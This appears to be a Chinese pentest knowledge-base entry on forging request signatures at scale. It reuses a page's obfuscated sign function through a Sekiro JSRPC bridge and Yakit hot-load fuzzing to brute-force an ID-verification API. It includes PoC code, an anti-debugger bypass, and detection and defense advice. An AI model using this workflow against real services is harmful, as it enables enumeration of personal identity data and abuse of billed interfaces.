---
id: web-generic-auth-sekiro-jsrpc-yakit-hotload-rensign-batch
title: Sekiro(自建 WebSocket JSRPC)+Yakit 热加载 fuzzer 标签：不还原混淆算法，用浏览器原生 sign 函数批量代签
type: scenario
domain: web
path: web/generic/auth
technique: sekiro-jsrpc-yakit-hotload-runtime-rensign
tags:
- api
- signature
- js-reverse
- jsrpc
- sekiro
- yakit
- websocket
- brute-force
- pentest
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-W3
  verified_at: '2026-11-08T12:40:02+08:00'
  notes: 已对照原文核对：Sekiro 客户端注入/registerAction、/business/invoke 取签、Yakit 热加载 {{yak}} 用法、无限 debugger 的 constructor 包装+sources 关闭断点均与原文与截图一致；修正了原文未声称的 HMAC-SHA256 与32位签名长度断言及热加载函数名笔误。未验证点：未在本地启动 Sekiro/Yakit 复现整条链；目标是否缺频控未验证。
url: /docs/web/generic/auth/web-generic-auth-sekiro-jsrpc-yakit-hotload-rensign-batch/
draft: false
kb_aliases:
- Sekiro 代签
- sekiro business/invoke
- Yakit 热加载 签名
- yak(signDecrypt) fuzzer 标签
- JSRPC 运行时复用签名函数
- 混淆 sign 绕过
---

## 一句话结论

当接口的 `sign` 由前端混淆 JS（甚至多层自研算法）生成、且接口没有频率限制时，不必还原算法：用 Sekiro（自建 WebSocket JSRPC 服务端）把浏览器页面里的原生签名函数注册成远程动作，再在 Yakit 热加载里写一个 `foo = func(...)`，用 fuzzer 标签 `{{yak(signDecrypt|...)}}` 对每个被改动的请求实时取回合法签名，即可把「有签名、不能爆破」的接口变成可批量枚举的接口。

## 原理

- **签名只是完整性校验，密钥在前端**：请求头里 `SIGN` 由前端函数算出（示例中是把 `APP_TIME + APP_LICENSE_ID + appKey + urlencode(name&id&)` 交给 `dd()`，再对结果做 HMAC-SHA256）。页面能跑通这个函数，就说明算法与密钥对任何登录用户都可见，签名不构成身份或授权边界。
- **为什么不能直接复刻算法**：实战目标常见多层加密/自研变换 + 代码混淆，完整还原成本极高；一旦算法细节变化（换 key、改拼接顺序、加随机盐）脚本立刻失效。
- **Sekiro 的作用**：它是一个 JSRPC 框架（浏览器/Android/Go 等多语言环境），客户端在页面里注入一段 JS 后主动用 WebSocket 连到自建服务端（`ws://127.0.0.1:5612/business/register?group=<组>&...`），并用 `client.registerAction("signDecrypt", function(request, resolve, reject){...})` 注册动作；服务端就可以通过 `GET http://127.0.0.1:5612/business/invoke?group=<组>&action=signDecrypt&data1=..&data2=..` 让页面执行并返回值。
- **关键一步是把签名函数提到全局**：在页面上下文里 `window.signDecrypt = dd;`（或包一层 HmacSHA256 的等价函数），Sekiro 的 action 里只做 `var res = window.signDecrypt(request["data1"], request["data2"]); resolve(res);`。这样即使 `dd` 是混淆过的闭包，也能被远程调用。
- **Yakit 热加载补齐自动化**：热加载代码里 `data1` 拼接时间戳/license/appKey/业务参数，`data2` 放 appKey，向 Sekiro 的 `/business/invoke` 发 GET 并 `json.Find(rsp.Data(), "$.data")` 取出签名；fuzzer 里写 `SIGN: {{yak(signDecrypt|...)}}`，Yakit 对每个 payload 单独调用一次热加载函数，于是每个请求都带合法签名。
- **批量成立的前提是服务端缺频控**：签名只防篡改/防伪造，不防重放、不防高频；接口无频率限制、无验证码/风控时，签名被自动化复用后即可枚举（示例是收费实名认证接口，枚举会产生未付费的资源调用）。

## 触发条件

- 目标接口带 `sign`/`SIGN`/`signature` 字段且后端确实校验（先用错签名/缺签名对照确认）。
- 签名算法在前端 JS 中可执行：能保住页面会话，或能把原函数暴露到 `window`。
- 浏览器与本地 Sekiro 服务端网络互通（默认 `127.0.0.1:5612`），WebSocket 不被 CSP/企业策略阻断。
- 接口缺少频率限制/验证码/设备指纹，否则批量会被风控挡住。
- 目标页可能有反调试（无限 `debugger`），需要先绕过才能下断点定位签名入口。

## 利用步骤

1. 抓包定位带签名的请求，确认哪些参数参与签名（常用的笨办法：逐个删减/替换参数，看服务端是否报「校验签名不通过」）。
2. 若遇到无限 `debugger`：先在 Sources 里对 `debugger` 行选「一律不在此处暂停」，并在 Console 注入 `Function.prototype.constructor` 包装（把参数为 `"debugger"` 的调用直接 `return null`），两招配合即可继续断点调试。
3. 关键词（如 `SIGN`、`APP_TIME`、`APP_LICENSE_ID`）搜索到签名生成处下断点，记录调用式：`sign = dd(APP_TIME + APP_LICENSE_ID + appKey + enc(name&id&), appKey)`。
4. 在 Console 里直接调用该函数验证：换一个 id（如把身份证末位改掉），传入固定的 `APP_TIME`/`APP_LICENSE_ID`/`appKey`，得到新签名并手工发包确认过签。
5. 把函数提到全局：`window.signDecrypt = dd;`（若原函数只接受拼接后的整串，则包一层按上面的顺序拼接的包装函数）。
6. 启动本地 Sekiro 服务端（open-demo 的 `bin` 下脚本启动，默认监听 5612）；在页面 Console 注入官方 `SekiroClient` 示例并做三处改动：`wss://` 改 `ws://127.0.0.1:5612`、`group` 改成自己的组名（与后续 invoke 的 `group` 一致）、`action` 名与 Yakit 里一致；`registerAction` 内部改为读 `request["data1"]`/`request["data2"]` 并调用 `window.signDecrypt`。
7. 用 `requests.get("http://127.0.0.1:5612/business/invoke", params={"group":..,"action":"signDecrypt","data1":..,"data2":..})` 验证返回 32 位 hex 签名。
8. 在 Yakit 热加载里写 `signDecrypt = func(sfz) { ... return json.Find(rsp.Data(), "$.data") }`，把 `SIGN` 头写成 `{{yak(signDecrypt|<参数>)}}`，业务体参数也写成 fuzzer 标签；启动爆破，确认每条请求返回 200 且不再报「校验签名不通过」。

## PoC

```javascript
// 1) 页面 Console：把混淆的签名函数提到全局（dd 为原签名函数）
window.signDecrypt = dd;
// 若 dd 只吃拼好的整串，则包一层：
window.signDecrypt = (time, licenseId, appKey, bizStr) => dd(time + licenseId + appKey + bizStr, appKey);

// 2) 注入 Sekiro 客户端并注册动作（相对官方示例只改三处）
const client = new SekiroClient("ws://127.0.0.1:5612/business/register?group=<group>&clientId=<id>");
client.registerAction("signDecrypt", function (request, resolve, reject) {
  try {
    const res = window.signDecrypt(request["data1"], request["data2"]);
    resolve(res);          // 返回签名
  } catch (e) { reject(); }
});
```

```python
# 3) 本地验证 Sekiro 是否把签名取回
import requests
data = {"group": "<group>", "action": "signDecrypt", "data1": "123", "data2": "123"}
print(requests.get("http://127.0.0.1:5612/business/invoke", params=data).text)
# 预期：{"clientId":"..","data":"<32 位签名>","status":0}
```

```javascript
// 4) Yakit 热加载 + fuzzer 标签批量代签
signDecrpt = func(sfz) {
  APP_TIME = "1735326352548"          // 固定时间戳（服务端时间窗够宽时可用）
  APP_LICENSE_ID = "<固定值>"
  appKey = "<appKey>"
  s = codec.EscapeQueryUrl("张三") + "&" + sfz + "&"
  data1 = APP_TIME + APP_LICENSE_ID + appKey + codec.EncodeUrl(s)
  data2 = appKey
  rsp = http.Get(f"http://127.0.0.1:5612/business/invoke?group=<group>&action=signDecrypt&data1=${data1}&data2=${data2}")~
  return json.Find(rsp.Data(), "$.data")
}
```

```text
# 5) 请求模板（fuzzer）
POST /api HTTP/1.1
SIGN: {{yak(signDecrypt|{{int:1(00-50)}})}}
APP_TIME: 1735326352548
APP_LICENSE_ID: <固定值>

{"cardId":"<身份证前缀>{{int:1(00-50)}}","cardName":"张三"}
# 每个 payload 都会单独触发一次热加载函数取回合法签名 → 返回 200 Success
```

## 变体与关联

- 变体：Burp 侧用 JSRPC（`Hlclient` + `JsEnv_Dev.js`）+ autoDecoder/Flask 的 `/encode` 做同样的代签，只是框架与中间件不同；两者都靠「浏览器里跑原函数」而不是复刻算法。
- 变体：Yakit 也可改用 `{{yak}}` 之外的数据包扫描/热加载 hook 直接改写整包再发；若签名绑定时间戳且有严格时间窗，把 `APP_TIME` 交给 JS 侧 `new Date().getTime()` 实时生成，或让页面自己算。
- 变体：`sign` 参与参数里有 `nonce`/随机盐时，一定要让原函数在页面里重算（不要手工拼），并通过 `data1/data2` 把整段业务串传过去。
- 关联：[[web-generic-auth-js-signature-jsrpc-autodecoder]]（同为「运行时复用前端签名函数」的思路，用 Hlclient JSRPC + autoDecoder）；[[code-analysis-reverse-anti-debug-js-infinite-debugger-bypass]]（静态 debugger 的 DevTools 绕过）；[[code-analysis-reverse-anti-debug-js-dynamic-debugger-hook]]（动态生成的 debugger 需 Hook eval/Function）。
- 边界：页面刷新/关闭后 Sekiro 连接断开、`window` 上的函数丢失，需重新注入；服务端若做 nonce 一次性校验或强时间窗，重签也只能覆盖单次请求；若目标对同一会话做设备指纹/频控，批量仍会失败。

## 检测与防御

- 检测：同一 token/会话对同一接口高频请求且签名全部合法、参数呈枚举分布；本机存在 `127.0.0.1:5612`/`12080` 等 JSRPC 端口的 WebSocket 长连接；请求头 `SIGN` 与页面函数输出一一对应但时间戳不随时间推进（固定 `APP_TIME`）。
- 检测：签名正确率 100% 且请求速率异常、无对应页面操作（无 Referer/无正常 UA 序列），结合业务风控告警。
- 防御：签名密钥与算法不要放在前端；签名只做完整性，授权与频控必须在服务端做（按账号/设备/IP 限流、验证码挑战、实名接口按订单校验）。
- 防御：敏感接口加 nonce/一次性票据 + 严格时间窗（如 30 秒）+ 服务端记录已用签名；对收费接口按调用量计费并对异常调用方熔断。
- 加固：前端反调试只提高分析成本，不能作为安全边界；关键校验逻辑保持服务端权威。

## 备注

原文未给出 CVE/版本信息（针对单个业务系统的实测），故省略 affected_versions。文中目标域名与业务标识均已改写为占位符。
